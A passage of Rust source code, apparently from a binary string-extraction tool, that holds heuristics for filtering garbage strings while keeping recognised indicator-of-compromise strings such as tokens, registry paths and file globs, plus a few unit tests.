        && non_ascii_count == 0
        && char_count <= 25
    {
        // Need mix of: uppercase + (digits or special)
        let has_uppercase = uppercase_count >= 1;
        let has_digits = digit_count >= 1;
        let has_special = special_count >= 1;

        // Pattern like uHu}uQu\uYu0u: uppercase, special, digits
        if has_uppercase && (has_digits || has_special) && (uppercase_count + special_count) >= 2 {
            return true;
        }
    }

    false
}

/// Returns true if the string has excessive non-ASCII content indicating corrupted/garbage data.
fn has_excess_non_ascii(s: &str, len: usize, stats: &CharStats) -> bool {
    let non_ascii_count = len - stats.ascii_count;
    if non_ascii_count == 0 {
        return false;
    }

    // Check for PE relocation table patterns first
    if is_reloc_table_pattern(s, len) {
        return true;
    }

    // Strings that are 100% non-ASCII and short are almost always garbage
    // (random bytes decoded as UTF-8), unless they're a single character
    if stats.ascii_count == 0 && len > 1 && len < 50 {
        return true;
    }

    if len < 30 {
        let alpha_percentage = (stats.alpha * 100)
            .checked_div(stats.char_count)
            .unwrap_or(0);
        let has_noise_punct = s.chars().any(|c| {
            matches!(
                c,
                '?' | '\u{00A5}'
                    | '\u{00B5}'
                    | '\u{00A8}'
                    | '\u{00B4}'
                    | '\u{00BB}'
                    | '\u{00AB}'
                    | '\u{00B0}'
                    | '\u{00B7}'
                    | '\u{00A6}'
                    | '\u{00AF}'
            )
        });
        if (alpha_percentage < MIN_NON_ASCII_ALPHABETIC_RATIO || has_noise_punct)
            && non_ascii_count * 100 / len > MAX_NON_ASCII_RATIO
        {
            return true;
        }
        if len < SHORT_NON_ASCII_CHECK_LEN && non_ascii_count >= MIN_NON_ASCII_COUNT_SHORT {
            return true;
        }

        // Multiple non-ASCII chars in short strings with mixed case is likely garbage
        // e.g., "uDuntßñ6OlÇÕ" - even if they're alphabetic, the pattern is random
        if non_ascii_count >= 3 && len < 20 && stats.upper > 0 && stats.lower > 0 {
            // If has digits mixed in, even more suspicious
            if stats.digit > 0 {
                return true;
            }
            // If has 3+ non-ASCII characters in a short string, likely garbage
            // unless it's a recognizable language pattern
            let non_ascii_ratio = non_ascii_count * 100 / len;
            if non_ascii_ratio > 25 {
                return true;
            }
        }

        // Repetitive patterns with non-ASCII are likely misaligned binary data
        // e.g., "zçz&zÇzÌzhzµzyz½z{zHz}zQz..." - single char repeated with noise
        if non_ascii_count >= 3 && stats.noise_punct >= 3 {
            return true;
        }
    } else {
        // Longer strings (>=30 chars)
        if non_ascii_count * 100 / len > 30 {
            return true;
        }
        // Repetitive patterns with non-ASCII and noise punctuation
        if non_ascii_count >= 3 && stats.noise_punct >= 3 {
            return true;
        }
    }

    // Detect repetitive single-char patterns like "zçz&zÇz..." where one letter
    // appears very frequently (>30% of chars) with non-ASCII mixed in
    if non_ascii_count >= 1 && len >= 10 {
        let mut char_counts = [0u8; 128]; // ASCII frequency counter
        for c in s.chars() {
            if c.is_ascii() {
                let idx = c as usize;
                if idx < 128 && char_counts[idx] < 255 {
                    char_counts[idx] += 1;
                }
            }
        }
        // Find max frequency
        let max_freq = char_counts.iter().max().copied().unwrap_or(0) as usize;
        // If any single ASCII char appears in more than 30% of positions, suspicious
        if max_freq * 100 / len > 30 {
            return true;
        }
    }

    // Short strings (4-8 chars) starting with digit + non-ASCII are garbage
    // e.g., "7üĐō", "4ÛŷƮ", "6Æťƒ" - random bytes decoded as UTF-8
    // Use char_count for proper Unicode handling
    if non_ascii_count >= 1 && stats.char_count <= 8 && stats.first_char.is_ascii_digit() {
        return true;
    }

    false
}

/// Returns true if the string is a plausible identifier or word-like sequence
/// that the chaos / mixed-case-digit / short-identifier filters would
/// otherwise reject for having too many class transitions.
///
/// Two shapes are accepted:
/// * **Pure ASCII letters, length ≥ 7** (`AbCdEfGh`, `TheQuickBrownFox`,
///   `PaSsWoRd`): a long sequence of nothing but letters is almost certainly
///   meaningful even when case alternates frequently. Pure all-caps and
///   all-lowercase are handled elsewhere; this arm covers the mixed-case
///   middle ground.
/// * **Pure ASCII alphanumeric with a ≥2-char same-class run** (`MD5Hash`,
///   `Ed25519`, `Curve25519`, `ToInt32`, `Argon2`, `CallByName`, `iPad`,
///   `hWnd`): one same-class run of length ≥ 2 (a multi-letter word, an
///   acronym, or a multi-digit version number) is enough structure to
///   distinguish a real identifier from noise like `A1b2c3` or `AaBbCc`,
///   where every position is in a different class than its neighbour.
fn looks_like_word_like(s: &str, len: usize, stats: &CharStats) -> bool {
    if stats.upper == 0 || stats.lower == 0 {
        return false;
    }
    // Pure ASCII letters: 7+ chars is enough signal on its own.
    if len >= 7 && stats.alpha == len && stats.ascii_count == len {
        return true;
    }
    // Pure ASCII alphanumeric — letters and optional digits, nothing else.
    // The class-run check below is too permissive at very short lengths
    // (4-char patterns like `Ilu4` or `cwZd` always hit a 2-char run and are
    // indistinguishable from real garbage), so this arm only fires at 5+.
    if len < 5 || stats.upper + stats.lower + stats.digit != len || stats.ascii_count != len {
        return false;
    }
    let class = |b: u8| -> u8 {
        if b.is_ascii_uppercase() {
            0
        } else if b.is_ascii_lowercase() {
            1
        } else {
            2 // digit
        }
    };
    let bytes = s.as_bytes();
    let mut max_run = 1usize;
    let mut cur_run = 1usize;
    for i in 1..bytes.len() {
        if class(bytes[i]) == class(bytes[i - 1]) {
            cur_run += 1;
            if cur_run > max_run {
                max_run = cur_run;
            }
        } else {
            cur_run = 1;
        }
    }
    max_run >= 2
}

/// Returns true if the string is a file-glob pattern like `*.exe`, `*.dll`,
/// or `*.tmp` — a literal asterisk + dot + 1–6 alphanumeric characters.
/// These are common malware indicators (search patterns, dropped-file
/// extensions) and the bare extension form (`.exe`) is already accepted.
fn is_file_glob(s: &str) -> bool {
    let Some(ext) = s.strip_prefix("*.") else {
        return false;
    };
    !ext.is_empty() && ext.len() <= 6 && ext.bytes().all(|b| b.is_ascii_alphanumeric())
}

/// Returns true if the string's character class run pattern indicates random/garbage data.
fn has_chaotic_char_pattern(s: &str, len: usize, stats: &CharStats) -> bool {
    if len < 6 {
        return false;
    }
    // Identifier-shaped or all-letter strings (CallByName, FooBarBaz,
    // ToInt32, AbCdEfGh) have short Upper/Lower runs by construction and
    // would otherwise trip the run-length and transition-ratio checks below.
    if looks_like_word_like(s, len, stats) {
        return false;
    }

    #[derive(PartialEq, Eq, Clone, Copy)]
    enum CharClass {
        Upper,
        Lower,
        Digit,
        Special,
        Whitespace,
    }

    // Stream the class-run metrics in one pass: every char belongs to exactly one
    // run, and runs are separated by transitions, so there are `transitions + 1`
    // runs covering `char_count` characters (len >= 6 guarantees char_count >= 1).
    let mut transitions = 0usize;
    let mut char_count = 0usize;
    let mut prev_class: Option<CharClass> = None;
    for c in s.chars() {
        let class = if c.is_ascii_uppercase() {
            CharClass::Upper
        } else if c.is_ascii_lowercase() {
            CharClass::Lower
        } else if c.is_ascii_digit() {
            CharClass::Digit
        } else if c.is_whitespace() {
            CharClass::Whitespace
        } else {
            CharClass::Special
        };
        char_count += 1;
        if prev_class.is_some_and(|p| p != class) {
            transitions += 1;
        }
        prev_class = Some(class);
    }

    let num_runs = transitions + 1;
    let avg_run_length = char_count as f32 / num_runs as f32;

    let max_class_count = stats
        .upper
        .max(stats.lower)
        .max(stats.digit)
        .max(stats.special);
    let is_mostly_one_class = max_class_count * 100 / len > MAX_CLASS_DOMINANCE_RATIO;

    let alphanumeric = stats.alphanumeric;
    let lower = stats.lower;
    let special = stats.special;
    let digit = stats.digit;

    let looks_like_path = (s.contains('/') || s.contains('\\'))
        && alphanumeric >= 3
        && special * 100 / len <= MAX_SPECIAL_RATIO_FOR_PATHS
        && (alphanumeric == 0 || lower * 100 / alphanumeric >= MIN_LOWERCASE_RATIO_FOR_PATHS)
        && (s.starts_with('/')
            || s.starts_with('\\')
            || s.contains("/.")
            || s.contains("\\.")
            || s.split(&['/', '\\'][..])
                .filter(|seg| !seg.is_empty())
                .count()
                >= 2);
    let looks_like_url = s.contains("://") || s.contains("http");
    let looks_like_domain = s.contains('.')
        && s.split('.').filter(|seg| !seg.is_empty()).count() >= MIN_SEGMENT_COUNT
        && special * 100 / len <= MAX_SPECIAL_RATIO_FOR_DOMAINS;
    let looks_like_version = (s.starts_with("go") || s.starts_with('v') || s.starts_with('V'))
        && s.contains('.')
        && digit > 0;
    let looks_like_base64 = len >= MIN_BASE64_LENGTH
        && stats.upper > 0
        && lower > 0
        && s.chars()
            .all(|c| c.is_alphanumeric() || c == '+' || c == '/' || c == '=');
    let looks_like_format_string = s.contains("%s")
        || s.contains("%d")
        || s.contains("%f")
        || s.contains("%x")
        || s.contains("%v")
        || s.contains("%p")
        || s.contains("%c")
        || s.contains("%u");
    // Multi-word fragments (assembly output like `MOV EAX, 0`, formatted
    // text, list literals) have whitespace separating meaningful tokens.
    // Their Upper/Lower/Special run pattern looks "chaotic" by the
    // class-transition metric, but the whitespace is itself the structure.
    // Guards: all-ASCII (excludes non-ASCII noise like `` `C dJe`eN{Û ``) and
    // at most one noise-punct char (excludes random punctuation like
    // `ZFI7% eE;*\\Y` that happens to contain one space).
    let looks_like_multi_word = stats.whitespace > 0
        && alphanumeric >= 4
        && stats.ascii_count == len
        && stats.noise_punct <= 1;
    let is_structured_pattern = looks_like_path
        || looks_like_url
        || looks_like_domain
        || looks_like_version
        || looks_like_base64
        || looks_like_format_string
        || looks_like_multi_word;

    if !is_mostly_one_class && !is_structured_pattern {
        if transitions * 100 / len > MAX_TRANSITION_RATIO {
            return true;
        }
        if avg_run_length < MAX_AVG_RUN_LENGTH_CHAOS && len >= 8 {
            return true;
        }
        if len <= 7 && avg_run_length < 1.5 && transitions >= 4 {
            return true;
        }
    } else if is_structured_pattern
        && avg_run_length < 2.0
        && len >= 10
        && !looks_like_path
        && !looks_like_domain
        && !looks_like_version
        && !looks_like_base64
        && !looks_like_format_string
        && !looks_like_url
        && !looks_like_multi_word
    {
        return true;
    }
    false
}

/// Determines if a string appears to be garbage/noise rather than meaningful content.
///
/// Fast path: Check if long strings with normal patterns are obviously valid.
///
/// This avoids expensive analysis for the common case.
fn is_fast_path_valid_with_kind(
    s: &str,
    len: usize,
    kind: Option<crate::types::StringKind>,
) -> bool {
    if len >= MIN_FAST_PATH_VALID_LENGTH {
        let bytes = s.as_bytes();
        let first = bytes[0];
        // Quick check for all-same-character strings (garbage)
        if bytes.iter().all(|&b| b == first) {
            return false;
        }
        // If it starts with a letter and has mostly alphanumeric + common punctuation, it's valid.
        // Single pass: collect everything needed for the ratio check and reloc rejection.
        if first.is_ascii_alphabetic() {
            let mut simple_count = 0usize;
            let mut letter_counts = [0u32; 26];
            let mut has_non_ascii = false;
            let mut uppercase = 0usize;
            let mut digit = 0usize;
            let mut special = 0usize;

            for &b in bytes {
                if b.is_ascii_alphanumeric() || matches!(b, b' ' | b'_' | b'-' | b'.' | b'/') {
                    simple_count += 1;
                }
                if b.is_ascii_lowercase() {
                    letter_counts[(b - b'a') as usize] += 1;
                } else if !b.is_ascii() {
                    has_non_ascii = true;
                } else if b.is_ascii_uppercase() {
                    uppercase += 1;
                } else if b.is_ascii_digit() {
                    digit += 1;
                } else if b != b' ' {
                    // ASCII, not alphanumeric, not space
                    special += 1;
                }
            }

            if simple_count * 100 / len >= MIN_FAST_PATH_ALPHABETIC_RATIO {
                let max_letter = letter_counts.iter().max().copied().unwrap_or(0) as usize;
                // For pure-ASCII strings char_count == len, avoiding an extra O(n) scan.
                let char_count = if has_non_ascii {
                    s.chars().count()
                } else {
                    len
                };

                if has_non_ascii {
                    // Reloc pattern: one letter dominates with non-ASCII noise
                    if char_count > 0 && max_letter * 100 / char_count > 30 {
                        return false;
                    }
                } else if char_count <= 25 && max_letter >= 3 {
                    // All-ASCII reloc pattern: dominant letter + mixed uppercase/digits/special
                    if max_letter * 100 / char_count >= 35
                        && uppercase >= 2
                        && (digit >= 1 || special >= 2)
                    {
                        return false;
                    }
                }
                return true;
            }
        }
    }

    // If the extractor already classified this string (or classify_string
    // recognises it now), it is not garbage.  When a classifier-produced
    // `kind` hint is passed in we avoid the second `classify_string` call —
    // it was the single largest hotspot on the garbage-filter path (the
    // classifier was being run twice per string).  Extractor-only labels
    // (`Overlay`, `Section`, `Import`, …) fall through to the real
    // classifier because those labels don't imply content recognition.
    if s.is_ascii() {
        if kind.is_some_and(crate::types::StringKind::is_classifier_output) {
            return true;
        }
        if crate::classifier::classify_string(s).is_some() {
            return true;
        }
    }

    false
}

/// Fast path: Check if string is obviously garbage without deep analysis.
fn is_fast_path_garbage(s: &str, original: &str, len: usize) -> bool {
    // Empty or single character
    if len == 0 || len == 1 {
        return true;
    }

    // Reject strings with embedded control characters. `s` is already trimmed
    // (whitespace, including `\n`, `\t`, and ` `, is stripped by `str::trim`),
    // so anything that survives is embedded mid-string and is genuine noise.
    if s.chars().any(char::is_control) {
        return true;
    }

    // Trailing spaces after short content indicate misaligned reads
    // Check original string before trimming
    if original.ends_with(' ') && original.len() < 10 {
        let alphanumeric = original.bytes().filter(u8::is_ascii_alphanumeric).count();
        if alphanumeric < 4 {
            return true;
        }
    }

    // Leading whitespace in short strings (like " 3343") is garbage
    if original.starts_with(' ') && original.len() < 15 {
        return true;
    }

    // Short strings with comma not in list context (no spaces around it) are garbage
    // e.g., "Zuçzj,w9m" - comma embedded in gibberish
    if s.contains(',') && len < 15 && !s.contains(", ") && !s.contains(" ,") {
        // Exception: numbers with commas (e.g., "1,000") are OK if mostly digits
        let digit_count = s.bytes().filter(u8::is_ascii_digit).count();
        let comma_count = memchr::memchr_iter(b',', s.as_bytes()).count();
        if digit_count * 2 < len - comma_count {
            // Not a number, and comma without space = garbage
            return true;
        }
    }

    // Literal escape sequences in short strings without code context are garbage.
    if len < MAX_SHORT_ESCAPE_LENGTH
        && (s.contains("\\x") || s.contains("\\u") || s.contains("\\U"))
    {
        let has_code_context = s.contains('"')
            || s.contains('\'')
            || s.contains('(')
            || s.contains('[')
            || s.contains("print")
            || s.contains("echo")
            || s.contains("const")
            || s.contains("var");
        if !has_code_context {
            return true;
        }
    }

    false
}

/// Check if string matches known Indicator of Compromise patterns.
///
/// These are high-value strings that should never be filtered.
fn is_recognized_ioc(s: &str, len: usize) -> bool {
    // File-glob patterns (`*.exe`, `*.dll`, `*.tmp`) — high-value malware
    // indicators that would otherwise be killed by the short-string
    // noise-punctuation filter because `*` is in the noise set.
    if is_file_glob(s) {
        return true;
    }
    // Crypto and malware IOCs
    if is_crypto_wallet_address(s, len) {
        return true;
    }
    if is_miner_ioc(s) {
        return true;
    }
    // Batched substring sweep: `.onion`, `HKLM\`, `HKCU\`, `HKEY_`, `LDAP://`,
    // `-----BEGIN`, `-----END`, `2>&1`, `<<`.  One AC find replaces the
    // eight-plus individual `s.contains(...)` scans these checks used to do.
    if ioc_substring_match(s, len) {
        return true;
    }

    // Authentication and tokens
    if is_ctf_or_guid(s, len) {
        return true;
    }
    // Contiguous runs of hex/colon/dash (UUIDs, hashes, MAC addresses,
    // public-key fingerprints, IPv6 fragments, build IDs). These all
    // trip the chaos filter because they oscillate between digit and
    // letter classes on nearly every byte.
    if is_hex_id_run(s, len) {
        return true;
    }
    // Longer runs of base64/base64url-alphabet characters: API tokens,
    // opaque service IDs, AES keys, short b64-encoded payloads.
    if is_token_id_run(s, len) {
        return true;
    }
    if is_email_address(s, len) {
        return true;
    }
    if is_jwt_token(s, len) {
        return true;
    }
    if is_api_key_pattern(s, len) {
        return true;
    }
    if is_telegram_bot_token(s, len) {
        return true;
    }
    if is_swift_mangled_symbol(s, len) {
        return true;
    }

    // `CN=` + `DC=` is compound (both must be present), so it stays separate.
    if s.contains("CN=") && s.contains("DC=") {
        return true;
    }

    // Attack patterns and code
    if is_attack_payload(s) {
        return true;
    }
    if is_code_pattern(s) {
        return true;
    }
    if is_obfuscated_js(s) {
        return true;
    }

    // Network and protocols
    if is_mac_address_or_ipv6(s, len) {
        return true;
    }

    // HTTP headers
    if (s.starts_with("Host:")
        || s.starts_with("User-Agent:")
        || s.starts_with("Content-Type:")
        || s.starts_with("Accept:")
        || s.starts_with("Authorization:")
        || s.starts_with("Cookie:"))
        && len >= 10
    {
        return true;
    }

    // Structured data
    if is_comma_separated_list(s, len) {
        return true;
    }
    if is_shell_command_string(s) {
        return true;
    }

    // Long hex strings are crypto hashes or keys
    if (MIN_HASH_LENGTH..=MAX_HASH_LENGTH).contains(&len) {
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
        if hex_count * 100 / len > MIN_HEX_RATIO_FOR_HASH {
            return true;
        }
    }

    // Locale codes
    if is_locale_code(s, len) {
        return true;
    }

    // XML/plist tags
    if s.starts_with('<') && s.ends_with('>') && len >= 3 {
        let inner = &s[1..len - 1];
        let is_valid_tag = inner.chars().all(|c| c.is_alphanumeric() || c == '/');
        if is_valid_tag && !inner.is_empty() {
            return true;
        }
    }

    // Shell commands with redirections/heredocs
    if s.contains("2>&1")
        || s.contains("2>")
        || s.contains("<<")
        || (s.contains(" > ") && s.split_whitespace().count() >= MIN_SEGMENT_COUNT)
    {
        let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
        let ascii_chars = s.bytes().filter(u8::is_ascii).count();
        let char_count = s.chars().count();
        if alnum_count >= 3
            && char_count > 0
            && ascii_chars * 100 / char_count > MIN_FAST_PATH_ALPHABETIC_RATIO
        {
            return true;
        }
    }

    false
}

/// Perform statistical analysis to determine if string is garbage.
///
/// This is the fallback when fast paths and IOC recognition don't apply.
fn is_statistical_garbage(
    s: &str,
    len: usize,
    stats: &CharStats,
    ctx: &crate::types::StringContext<'_>,
) -> bool {
    // Short pattern checks
    if is_short_identifier_garbage(s, len, stats) {
        return true;
    }

    // Repeating digit patterns like "537353W353" - digits repeat in a pattern with few letters
    // Exception: hex addresses like "0x12345678" are valid
    if len >= 8 && stats.digit >= 6 && stats.alpha <= 2 {
        let is_hex_address = s.starts_with("0x") || s.starts_with("0X");
        if !is_hex_address {
            return true;
        }
    }

    // Short strings (4-10 chars) with mixed case and digits that don't look like identifiers
    // e.g., "gvjc54" - lowercase + digit but no vowels and doesn't follow naming conventions
    if (4..=10).contains(&len) && stats.lower > 0 && stats.digit > 0 && stats.upper == 0 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();
        // If no vowels and has digits embedded in lowercase, likely garbage
        if vowel_count == 0 && stats.lower >= 3 && stats.digit >= 1 {
            return true;
        }
    }

    // Short all-lowercase strings (4-5 chars) that don't look like real words
    // e.g., "oujr", "omor", "kmnro" - unusual phonotactic patterns
    if (4..=5).contains(&len) && stats.lower == len && stats.digit == 0 && stats.upper == 0 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();

        // No vowels at all - likely random garbage
        if vowel_count <= 1 {
            // Whitelist common short words/abbreviations
            let known_short = [
                "init", "main", "type", "file", "func", "data", "test", "temp", "code", "info",
                "user", "node", "sync", "async", "true", "null", "void", "char", "bool", "time",
                "size", "path", "name", "text",
            ];
            if !known_short.contains(&s) {
                return true;
            }
        }

        // Unusual patterns: starts with vowel followed by unusual consonant combinations
        // e.g., "oujr", "omor" - vowel followed by uncommon consonant clusters
        if stats.first_char == 'o' || stats.first_char == 'u' {
            // Check if it follows typical English patterns
            let chars: Vec<char> = s.chars().collect();
            if chars.len() == 4 {
                // 4-char words starting with o/u are suspicious - whitelist known ones
                let known_ou_4char = [
                    "open", "over", "only", "once", "used", "upon", "unit", "user", "undo", "unix",
                    "okay", "oral", "opus",
                ];
                if !known_ou_4char.contains(&s) {
                    return true;
                }
            } else if chars.len() == 5 {
                // 5-char words starting with o/u - also whitelist
                let known_ou_5char = [
                    "other", "order", "offer", "under", "until", "using", "usual", "opera",
                    "outer", "owner", "union",
                ];
                if !known_ou_5char.contains(&s) {
                    // Check for common suffix patterns
                    let ends_like_word = s.ends_with("er")
                        || s.ends_with("ed")
                        || s.ends_with("ly")
                        || s.ends_with("al")
                        || s.ends_with("le")
                        || s.ends_with("en")
                        || s.ends_with("es");
                    if !ends_like_word {
                        return true;
                    }
                }
            }
        }
    }

    // Strings with multiple consecutive quotes are likely misaligned data
    if s.contains("\"\"") || s.contains("'''") {
        return true;
    }

    // Note: Short digit+uppercase 4-char patterns like "8BIM", "0GZF" are often legitimate
    // identifiers (file signatures, codes). We don't filter them to avoid false positives.
    // is_short_identifier_garbage already handles these via is_digit_upper_id check.

    // Short all-uppercase strings (4 chars) with repeated characters are usually garbage
    // e.g., "ZYII", "ABCC" - unless they're known abbreviations
    if len == 4 && stats.upper == len && stats.digit == 0 {
        let chars: Vec<char> = s.chars().collect();
        // Check for doubled characters at end (common in garbage)
        if chars[2] == chars[3] {
            // Whitelist known abbreviations with doubled chars
            let known_doubled = ["IEEE", "COMM", "AABB", "CFFF"];
            if !known_doubled.contains(&s) {
                return true;
            }
        }
    }

    // Very short strings (4 chars) with lowercase + single digit at end
    // e.g., "kmo8", "abc1" - unless it follows naming conventions or is known
    if len == 4 && stats.lower >= 2 && stats.digit == 1 && stats.upper == 0 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();
        // If has 0-1 vowels and ends with digit, likely garbage
        if vowel_count <= 1 && stats.last_char.is_ascii_digit() {
            // Whitelist known patterns (encoding, crypto, architecture suffixes)
            let known_4char_suffix = ["sha1", "md5", "utf8", "mp3", "mp4", "avi"];
            if !known_4char_suffix.iter().any(|k| s.eq_ignore_ascii_case(k)) {
                return true;
            }
        }
    }

    // Very short all-digit strings (4-5 chars) with very limited variety are usually garbage
    // e.g., "3333", "1111" - unless they're port numbers, years, or known patterns
    if (4..=5).contains(&len) && stats.digit == len && stats.upper == 0 && stats.lower == 0 {
        let chars: Vec<char> = s.chars().collect();
        // Check for year-like patterns (19xx, 20xx)
        if chars.len() == 4 {
            let first_two: String = chars[0..2].iter().collect();
            if first_two == "19" || first_two == "20" {
                // Likely a year - don't filter
            } else {
                // Only filter if ALL digits are the same (e.g., "3333", "1111")
                let unique_digits: std::collections::HashSet<_> = chars.iter().collect();
                if unique_digits.len() == 1 {
                    return true;
                }
            }
        }
    }

    // Short strings with noise punctuation are garbage — unless the string
    // also contains whitespace, in which case it's likely a multi-word
    // fragment (assembly output like `MOV EAX, 0`, list literals, formatted
    // text) where the punctuation is structural rather than noise.
    if len <= 10 && stats.noise_punct > 0 && stats.whitespace == 0 {
        return true;
    }

    // Trailing spaces after short content indicate misaligned reads
    if s.ends_with(' ') && len < 10 && stats.alphanumeric < 4 {
        return true;
    }

    // Pattern: ends with backtick + single letter (Go misaligned reads)
    let bytes = s.as_bytes();
    if len >= MIN_SEGMENT_COUNT
        && let Some(idx) = bytes.iter().rposition(|&b| b.is_ascii_alphabetic())
        && idx > 0
        && bytes[idx - 1] == b'`'
    {
        return true;
    }

    if len <= 4 && stats.alphanumeric < len / 2 {
        return true;
    }

    if len <= 8 && (stats.open_parens != stats.close_parens || stats.quotes == 1) {
        return true;
    }

    if is_short_binary_garbage(s, len, stats) {
        return true;
    }

    if is_x86_save_sequence_fragment(s, len, stats, ctx) {
        return true;
    }

    // Medium-length strings with mixed case and digits are noise from compressed data
    if (MIXED_CASE_DIGIT_MIN_LEN..=MIXED_CASE_DIGIT_MAX_LEN).contains(&len)
        && stats.digit > 0
        && stats.upper > 0
        && stats.lower > 0
    {
        let looks_like_version =
            s.starts_with("go") || s.starts_with('v') || s.starts_with('V') || s.contains('.');
        // Crypto/algorithm names (`MD5Hash`, `SHA256Init`, `Curve25519`,
        // `Ed25519`, `ToInt32`) all match this rule but are valid identifiers.
        // `looks_like_word_like` keeps them while still rejecting random
        // patterns like `A1b2c3` where no class has a ≥2-char run.
        if !looks_like_version && !looks_like_word_like(s, len, stats) {
            return true;
        }
    }

    // Consistent-case alphanumeric patterns (7-8 chars) are valid identifiers
    // e.g., "UTF16LE", "BASE64" - patterns like encoding names, algorithms
    // Reject alternating patterns like "0a1b2c3d" (too many transitions)
    // Reject single leading 0 or 1 (unusual in real identifiers)
    // (4-6 char patterns are handled by is_short_identifier_garbage)
    let chars: Vec<char> = s.chars().collect();
    let has_suspicious_leading_digit = (stats.first_char == '0' || stats.first_char == '1')
        && chars.len() > 1
        && !chars[1].is_ascii_digit();
    // Valid identifiers are ASCII-only, so check ascii_count == len
    let is_all_ascii = stats.ascii_count == len;
    if (7..=8).contains(&len)
        && is_all_ascii
        && stats.special == 0
        && stats.digit > 0
        && stats.alpha > 0
        && (stats.lower == 0 || stats.upper == 0)
        && !(stats.first_char.is_ascii_digit() && stats.last_char.is_ascii_digit())
        && !has_suspicious_leading_digit
        && stats.alternations < 4
    // Reject highly alternating patterns
    {
        return false; // Valid identifier pattern
    }

    if len >= 4 && stats.alphanumeric == 0 {
        return true;
    }

    if len >= MIN_CHAOTIC_PATTERN_LENGTH
        && stats.digit > 0
        && stats.alpha > 0
        && stats.alternations >= MIN_TRANSITIONS_FOR_CHAOS
        && stats.alternations * 2 >= len
    {
        return true;
    }

    if stats.char_count > MIN_CHAOTIC_PATTERN_LENGTH
        && stats.alphanumeric * 100 / stats.char_count < MIN_ALPHANUMERIC_RATIO
    {
        return true;
    }

    // Random hex/binary data (all hex chars, no non-hex letters, not prefixed 0x)
    if len >= 8
        && !stats.has_non_hex_letter
        && stats.hex_only == len
        && stats.digit > 0
        && stats.alpha > 0
        && !s.contains('.')
        && !s.starts_with("0x")
    {
        return true;
    }

    if len >= 4 && stats.all_same {
        return true;
    }

    if stats.whitespace > 0 && stats.whitespace * 100 / len > MAX_WHITESPACE_RATIO {
        return true;
    }

    if has_excess_non_ascii(s, len, stats) {
        return true;
    }

    // Short strings ending with unusual unicode are suspicious
    if !stats.last_char.is_ascii() && len < 15 && stats.alphanumeric < len / 2 {
        return true;
    }

    // Obfuscated Python: mangled identifiers (llIIlIl...) with Python keywords
    if (s.contains("def ")
        || s.contains("return ")
        || s.contains("import ")
        || s.contains(".replace("))
        && len >= 20
    {
        let has_many_identifiers = stats.upper > 5 && stats.lower > 5;
        let has_reasonable_alnum = stats.alphanumeric >= 12;
        if has_many_identifiers && has_reasonable_alnum {
            return false;
        }
    }

    if has_chaotic_char_pattern(s, len, stats) {
        return true;
    }

    // All-ASCII reloc table patterns (checked separately since has_excess_non_ascii skips ASCII)
    if is_reloc_table_pattern(s, len) {
        return true;
    }

    false
}

/// This heuristic detects common patterns of misaligned reads and low-value strings:
/// - Short strings with non-alphanumeric characters
/// - Strings ending with backtick + letter + spaces (misaligned Go data)
/// - Strings with very low alphanumeric ratio
/// - Strings that are mostly whitespace padding
/// - Strings with embedded null or control characters
#[must_use]
pub fn is_garbage(s: &str) -> bool {
    is_garbage_with_context(s, &crate::types::StringContext::empty())
}

/// Like [`is_garbage`], but takes a `kind` hint produced by the extractor.
///
/// When `kind` is `Some(_)`, the string was already recognised by the
/// classifier (or labelled by a format-specific extractor — imports, stack
/// strings, etc.) and we can skip the two most expensive steps:
///
/// 1. The `classify_string` re-call inside `is_fast_path_valid` (was ~9 % of
///    stng wall time on a real profile — the classifier was being run twice
///    per string on the garbage-filter path).
/// 2. The `is_recognized_ioc` sweep (20+ `contains`/`starts_with` scans, was
///    8.14 % of stng wall time).
///
/// The reloc/statistical checks still run, so a classified string whose bytes
/// happen to look like a misaligned binary read can still be filtered.
#[must_use]
pub fn is_garbage_with_kind(s: &str, kind: Option<crate::types::StringKind>) -> bool {
    is_garbage_with_context(s, &crate::types::StringContext::with_kind(kind))
}

/// Garbage check with full context: `kind`, `section`, and `arch`.
///
/// Architecture- and section-aware rules use the context to scope
/// themselves — for example the x86 register save-sequence detector
/// only fires when `arch` is `None` (unknown) or x86-family AND
/// `section` is `None` or a known code section.  Callers that don't
/// know their context can pass [`StringContext::empty`] and get the
/// same behavior as `is_garbage(s)` did before context was added.
///
/// Use cases:
/// * stng CLI: bind `--arch x86_64 --section .text` flags into a
///   context to enable code-only filters.
/// * Library callers (cleave, …): build per-string context from the
///   binary they're analyzing (ELF/PE/Mach-O machine field +
///   section name).
/// * Source-code scans: pass `arch: None, section: None` — the asm
///   filter intentionally stays inactive when the bytes weren't
///   extracted from a code section.
#[must_use]
pub fn is_garbage_with_context(s: &str, ctx: &crate::types::StringContext<'_>) -> bool {
    let trimmed = s.trim();
    let len = trimmed.len();

    // Fast path: obvious valid strings (kind-aware: skips classify_string re-call)
    if is_fast_path_valid_with_kind(trimmed, len, ctx.kind) {
        return false;
    }

    // Fast path: obvious garbage
    if is_fast_path_garbage(trimmed, s, len) {
        return true;
    }

    // Classifier-produced kinds (URL, Path, Email, …) skip the 20+ IOC
    // pattern sweep — the classifier has already recognised the string as a
    // specific pattern.  Extractor-only labels (Overlay, Section, Import,
    // StackString, …) still run through `is_recognized_ioc` and the
    // statistical checks because those labels don't imply content
    // recognition — they indicate *provenance*.
    if ctx
        .kind
        .is_some_and(crate::types::StringKind::is_classifier_output)
    {
        return false;
    }

    // Known IOC patterns (malware indicators, crypto, auth tokens, etc.)
    if is_recognized_ioc(trimmed, len) {
        return false;
    }

    // Statistical analysis (character distribution, patterns, transitions)
    let stats = CharStats::from_str(trimmed);
    is_statistical_garbage(trimmed, len, &stats, ctx)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_garbage_valid_strings() {
        // Valid strings should NOT be garbage
        assert!(!is_garbage("Hello World"));
        assert!(!is_garbage("go1.22.0"));
        assert!(!is_garbage("/usr/lib/go"));
        assert!(!is_garbage("runtime.memequal"));
        assert!(!is_garbage("SIGFPE: floating-point exception"));
        assert!(!is_garbage("Bool"));
        assert!(!is_garbage("Time"));
        assert!(!is_garbage("linux"));
        assert!(!is_garbage("amd64"));
        assert!(!is_garbage("https://example.com"));
        assert!(!is_garbage("ERROR_CODE_123"));
    }

